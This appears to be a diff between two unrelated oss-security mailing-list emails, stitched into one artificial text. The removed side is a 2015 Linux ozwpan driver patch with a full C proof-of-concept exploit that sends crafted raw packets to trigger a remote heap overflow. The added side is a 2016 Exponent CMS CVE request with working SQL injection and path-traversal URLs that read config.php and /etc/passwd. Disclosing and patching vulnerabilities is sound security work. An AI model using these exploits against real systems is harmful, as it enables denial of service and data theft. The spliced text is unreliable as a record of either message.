@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["6232" "Wednesday" "13" "May" "2015" "20:33:32" "+0200" "Jason A. Donenfeld" "Jason@zx2c4.com" "<1431542014-3239-3-git-send-email-Jason@zx2c4.com>" "225" "[oss-security] [PATCH 2/4] ozwpan: Use unsigned ints to prevent heap overflow" nil nil nil "5" "2015051318:33:32" "[oss-security] [PATCH 2/4] ozwpan: Use unsigned ints to prevent heap overflow" (number mark "U       Jason@zx2c4. May 13  225/6232  " thread-indent "\"[oss-security] [PATCH 2/4] ozwpan: Use unsigned ints to prevent heap overflow\"\n") "<1431542014-3239-1-git-send-email-Jason@zx2c4.com>" ("<1431542014-3239-1-git-send-email-Jason@zx2c4.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1596" "Sunday" "18" "September" "2016" "11:52:58" "+0800" "felix k3y" "felixk3y@gmail.com" "<CAEiFw0WYE5q8jTO5napPQRKuGfnm1Q-VHg_ioEsKN6PX6Lxdnw@mail.gmail.com>" "47" "[oss-security] =?UTF-8?B?Q1ZFIHJlcXVlc3TvvJpFeHBvbmVudCBDTVMgMi4zLjkgU1FMIGluamVjdGlvbiB2dWxuZQ==?==?UTF-8?B?cmFiaWxpdHk=?=" nil nil nil "9" "2016091803:52:58" "[oss-security] =?UTF-8?B?Q1ZF?= =?UTF-8?B?cmVxdWVzdO+8mkV4cG9uZW50?= =?UTF-8?B?Q01T?= =?UTF-8?B?Mi4zLjk=?= =?UTF-8?B?U1FM?= =?UTF-8?B?aW5qZWN0aW9u?= =?UTF-8?B?dnVsbmU=?==?UTF-8?B?cmFiaWxpdHk=?=" (number mark "U       felixk3y@gma Sep 18   47/1596  " thread-indent "\"[oss-security] =?UTF-8?B?Q1ZFIHJlcXVlc3TvvJpFeHBvbmVudCBDTVMgMi4zLjkgU1FMIGluamVjdGlvbiB2dWxuZQ==?==?UTF-8?B?cmFiaWxpdHk=?=\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 7303 invoked by uid 550); 13 May 2015 18:35:11 -0000
+Received: (qmail 17628 invoked by uid 550); 18 Sep 2016 04:01:26 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,250 +12,83 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 3802 invoked from network); 13 May 2015 18:34:39 -0000
-DKIM-Signature: v=1; a=rsa-sha1; c=relaxed; d=zx2c4.com; h=from:to:cc
-	:subject:date:message-id:in-reply-to:references; s=mail; bh=4s8U
-	Akly6i3zTHpYHRy1sssBI8w=; b=YEwpbOETLjPVYUBjhWT+h/tHX0qqLdT4bsgX
-	YSUiuESfQgwVZdpnnDb26tcZcxjOCinadxxD22rWDUucXRlKbIT0LY5iJQly4VLE
-	HSO+eGlxzfs+zzHrBOeS8PdJF4uy5J09rQgPjeVM5OkhQjKzMD+pmnRJ2Prk2iWx
-	EmCT4bQT25yqMPU3sNiRpIP4wjRppotKayFHqRzg+9pIwX/Juz/LqWWRLrJKVD4m
-	pCpU5a823qBXRUOv3EhxWB7xnZFO4UmvheqhzVPc7nOm2joAn0/Gglu6tW1pzNer
-	WKqapb7fFzj0ZsgFXs9R1sg7v67pQp8q6zxN7uaQ+b1His8Y9Q==
-From: "Jason A. Donenfeld" <Jason@zx2c4.com>
-To: shigekatsu.tateno@atmel.com,
-	linux-kernel@vger.kernel.org,
-	netdev@vger.kernel.org,
-	oss-security@lists.openwall.com
-Cc: "Jason A. Donenfeld" <Jason@zx2c4.com>
-Date: Wed, 13 May 2015 20:33:32 +0200
-Message-Id: <1431542014-3239-3-git-send-email-Jason@zx2c4.com>
-X-Mailer: git-send-email 2.3.6
-In-Reply-To: <1431542014-3239-1-git-send-email-Jason@zx2c4.com>
-References: <1431542014-3239-1-git-send-email-Jason@zx2c4.com>
-Subject: [oss-security] [PATCH 2/4] ozwpan: Use unsigned ints to prevent heap overflow
+Received: (qmail 13687 invoked from network); 18 Sep 2016 03:53:10 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20120113;
+        h=mime-version:from:date:message-id:subject:to;
+        bh=GMpemaoCTpyTh2yC9ydBvyU16IS8Ot3vxKndjWNanwI=;
+        b=xVXT/r5QJB+spQ5tfVmq3rmPx3x9+OMJagf9TEpQbCmrU+YgvchyjI/eGHH5Hvusm5
+         5l6R7uKdJQW8HHleyfqfRL+KSrW9kG3DM9nEUo40bZv2ZLRBK1dRPxP1UhxbZBN19osz
+         tRNd7zYYI+C35btAp7dTGMmlhwwXkAdJ0+Yq0i9VzgHJ+Zhu5+27QB24ys2z4xqKD9Ii
+         4Rj5p9bUJFPXUMP0U9wInPmAewm/X7wdf/z2AhUoYVICw8Qb90Szq218HjBPAuiuSOGv
+         ix4t1oFp8Q9iRop0rgRyHo+NwB9f5YxVcY01RYMpK4lJ9SA0yE/2EM5wyA3kk8x1+Mnt
+         VgmA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
+        bh=GMpemaoCTpyTh2yC9ydBvyU16IS8Ot3vxKndjWNanwI=;
+        b=k2fVG5lt4mk0RZMhtAFIGyR7O+OXMDTa9SKWAnWM3ojfLK5bcTvVA+rufbW6lRUgld
+         tKlKF+pUc5HyUkUfh/GfGfU+kaEnjgc0ALZtBRkl7JbyM8PuwFRo4Y/6ljGi7lfjSnbo
+         sTJ3QwronD1rZSLXQwviKdTmvHMuy1etfOuzitMZCojmmVTvqDIAkPlwpFwtd68dFU1S
+         jaXzlVi2483uvb0fzjG/6uqT2WhdStaDHyZda+SGtfV/hNOsDi22jkAoyZT8HEuJbRyV
+         DsnhJWLzUMhJqfhKKsZ1K1PFcxMt9AAt0CVsPKPRMB6dr/rcvFF7FZJ+XHiT25/QkZEM
+         Wj7g==
+X-Gm-Message-State: AE9vXwMmp3BB72qWc5PJOvAK8W6fD/UCUImSFMBrPBg04IbYjn3tVbL7EFod8qyVSZe8vJGQ1xtKKbWCL5Mgug==
+X-Received: by 10.195.9.73 with SMTP id dq9mr18775948wjd.31.1474170778880;
+ Sat, 17 Sep 2016 20:52:58 -0700 (PDT)
+MIME-Version: 1.0
+From: felix k3y <felixk3y@gmail.com>
+Date: Sun, 18 Sep 2016 11:52:58 +0800
+Message-ID: <CAEiFw0WYE5q8jTO5napPQRKuGfnm1Q-VHg_ioEsKN6PX6Lxdnw@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Content-Type: multipart/alternative; boundary=001a113620ea9d0e4c053cc02196
+Subject: [oss-security] =?UTF-8?Q?CVE_request=EF=BC=9AExponent_CMS_2=2E3=2E9_SQL_injection_vulne?=
+	=?UTF-8?Q?rability?=
 
-Using signed integers, the subtraction between required_size and offset
-could wind up being negative, resulting in a memcpy into a heap buffer
-with a negative length, resulting in huge amounts of network-supplied
-data being copied into the heap, which could potentially lead to remote
-code execution.. This is remotely triggerable with a magic packet.
-A PoC which obtains DoS follows below. It requires the ozprotocol.h file
-from this module.
+--001a113620ea9d0e4c053cc02196
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
 
-=-=-=-=-=-=
+Hi , I reported the following SQL Injection vulnerability to the
+ExponentCMS team on Sep 15, 2016:
 
- #include <arpa/inet.h>
- #include <linux/if_packet.h>
- #include <net/if.h>
- #include <netinet/ether.h>
- #include <stdio.h>
- #include <string.h>
- #include <stdlib.h>
- #include <endian.h>
- #include <sys/ioctl.h>
- #include <sys/socket.h>
+https://github.com/exponentcms/exponent-cms/blob/master/framework/modules/p=
+ixidou/controllers/pixidouController.php#L83-L91
+The "fid" parameter fail to sufficiently sanitize before using it in an SQL
+query, In This vulnerability, also lead to  Directory traversal=E3=80=81Rem=
+ote code
+execution vulnerabilities etc..
 
- #define u8 uint8_t
- #define u16 uint16_t
- #define u32 uint32_t
- #define __packed __attribute__((__packed__))
- #include "ozprotocol.h"
+1) Directory traversal vulnerability
+http://www.exponentcms.org/index.php?controller=3Dpixidou&action=3DexitEdit=
+or&exitType=3DsaveAsIs&fid=3D-1'
+union select
+1,'./','1.txt',4,5,6,7,8,9,0,1,2,3,4,5%23&cpi=3D../../framework/conf/config=
+.php
 
-static int hex2num(char c)
-{
-	if (c >= '0' && c <= '9')
-		return c - '0';
-	if (c >= 'a' && c <= 'f')
-		return c - 'a' + 10;
-	if (c >= 'A' && c <= 'F')
-		return c - 'A' + 10;
-	return -1;
-}
-static int hwaddr_aton(const char *txt, uint8_t *addr)
-{
-	int i;
-	for (i = 0; i < 6; i++) {
-		int a, b;
-		a = hex2num(*txt++);
-		if (a < 0)
-			return -1;
-		b = hex2num(*txt++);
-		if (b < 0)
-			return -1;
-		*addr++ = (a << 4) | b;
-		if (i < 5 && *txt++ != ':')
-			return -1;
-	}
-	return 0;
-}
+2) Remote code execution
+ i. Upload any legal files through website(.jpg|.gif etc..)
+ ii. copy file to evil file(.php etc..)
 
-int main(int argc, char *argv[])
-{
-	if (argc < 3) {
-		fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0]);
-		return 1;
-	}
+Proof of concept:
+http://www.exponentcms.org/index.php?controller=3Dpixidou&action=3DexitEdit=
+or&exitType=3DsaveAsIs&fid=3D-1'
+union select
+1,'./','evil.php',4,5,6,7,8,9,0,1,2,3,4,5%23&cpi=3D../../../../../../../../=
+etc/passwd
 
-	uint8_t dest_mac[6];
-	if (hwaddr_aton(argv[2], dest_mac)) {
-		fprintf(stderr, "Invalid mac address.\n");
-		return 1;
-	}
+And Now, The SQL Injection vulnerability have been fixed.
+https://exponentcms.lighthouseapp.com/projects/61783/changesets/c1092f167cc=
+6c78dc8bf9bf149946c5219413df3
+https://github.com/exponentcms/exponent-cms/commit/c1092f167cc6c78dc8bf9bf1=
+49946c5219413df3
 
-	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
-	if (sockfd < 0) {
-		perror("socket");
-		return 1;
-	}
+Has a CVE been assigned to this issue already? if not I request that
+one is assigned.
 
-	struct ifreq if_idx;
-	int interface_index;
-	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);
-	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
-		perror("SIOCGIFINDEX");
-		return 1;
-	}
-	interface_index = if_idx.ifr_ifindex;
-	if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {
-		perror("SIOCGIFHWADDR");
-		return 1;
-	}
-	uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;
+thx.
+--------------------------------------
+penghua # silence.com.cn
+PKAV Team
 
-	struct {
-		struct ether_header ether_header;
-		struct oz_hdr oz_hdr;
-		struct oz_elt oz_elt;
-		struct oz_elt_connect_req oz_elt_connect_req;
-	} __packed connect_packet = {
-		.ether_header = {
-			.ether_type = htons(OZ_ETHERTYPE),
-			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
-			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
-		},
-		.oz_hdr = {
-			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
-			.last_pkt_num = 0,
-			.pkt_num = htole32(0)
-		},
-		.oz_elt = {
-			.type = OZ_ELT_CONNECT_REQ,
-			.length = sizeof(struct oz_elt_connect_req)
-		},
-		.oz_elt_connect_req = {
-			.mode = 0,
-			.resv1 = {0},
-			.pd_info = 0,
-			.session_id = 0,
-			.presleep = 35,
-			.ms_isoc_latency = 0,
-			.host_vendor = 0,
-			.keep_alive = 0,
-			.apps = htole16((1 << OZ_APPID_USB) | 0x1),
-			.max_len_div16 = 0,
-			.ms_per_isoc = 0,
-			.up_audio_buf = 0,
-			.ms_per_elt = 0
-		}
-	};
-
-	struct {
-		struct ether_header ether_header;
-		struct oz_hdr oz_hdr;
-		struct oz_elt oz_elt;
-		struct oz_get_desc_rsp oz_get_desc_rsp;
-	} __packed pwn_packet = {
-		.ether_header = {
-			.ether_type = htons(OZ_ETHERTYPE),
-			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
-			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
-		},
-		.oz_hdr = {
-			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
-			.last_pkt_num = 0,
-			.pkt_num = htole32(1)
-		},
-		.oz_elt = {
-			.type = OZ_ELT_APP_DATA,
-			.length = sizeof(struct oz_get_desc_rsp)
-		},
-		.oz_get_desc_rsp = {
-			.app_id = OZ_APPID_USB,
-			.elt_seq_num = 0,
-			.type = OZ_GET_DESC_RSP,
-			.req_id = 0,
-			.offset = htole16(2),
-			.total_size = htole16(1),
-			.rcode = 0,
-			.data = {0}
-		}
-	};
-
-	struct sockaddr_ll socket_address = {
-		.sll_ifindex = interface_index,
-		.sll_halen = ETH_ALEN,
-		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
-	};
-
-	if (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
-		perror("sendto");
-		return 1;
-	}
-	usleep(300000);
-	if (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
-		perror("sendto");
-		return 1;
-	}
-	return 0;
-}
-
-Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
----
- drivers/staging/ozwpan/ozhcd.c   | 8 ++++----
- drivers/staging/ozwpan/ozusbif.h | 4 ++--
- 2 files changed, 6 insertions(+), 6 deletions(-)
-
-diff --git a/drivers/staging/ozwpan/ozhcd.c b/drivers/staging/ozwpan/ozhcd.c
-index 5ff4716..784b5ec 100644
---- a/drivers/staging/ozwpan/ozhcd.c
-+++ b/drivers/staging/ozwpan/ozhcd.c
-@@ -746,8 +746,8 @@ void oz_hcd_pd_reset(void *hpd, void *hport)
- /*
-  * Context: softirq
-  */
--void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,
--			int length, int offset, int total_size)
-+void oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status, const u8 *desc,
-+			u8 length, u16 offset, u16 total_size)
- {
- 	struct oz_port *port = hport;
- 	struct urb *urb;
-@@ -759,8 +759,8 @@ void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,
- 	if (!urb)
- 		return;
- 	if (status == 0) {
--		int copy_len;
--		int required_size = urb->transfer_buffer_length;
-+		unsigned int copy_len;
-+		unsigned int required_size = urb->transfer_buffer_length;
- 
- 		if (required_size > total_size)
- 			required_size = total_size;
-diff --git a/drivers/staging/ozwpan/ozusbif.h b/drivers/staging/ozwpan/ozusbif.h
-index 4249fa3..d2a6085 100644
---- a/drivers/staging/ozwpan/ozusbif.h
-+++ b/drivers/staging/ozwpan/ozusbif.h
-@@ -29,8 +29,8 @@ void oz_usb_request_heartbeat(void *hpd);
- 
- /* Confirmation functions.
-  */
--void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status,
--	const u8 *desc, int length, int offset, int total_size);
-+void oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status,
-+	const u8 *desc, u8 length, u16 offset, u16 total_size);
- void oz_hcd_control_cnf(void *hport, u8 req_id, u8 rcode,
- 	const u8 *data, int data_len);
- 
--- 
-2.3.6
-
+--001a113620ea9d0e4c053cc02196--
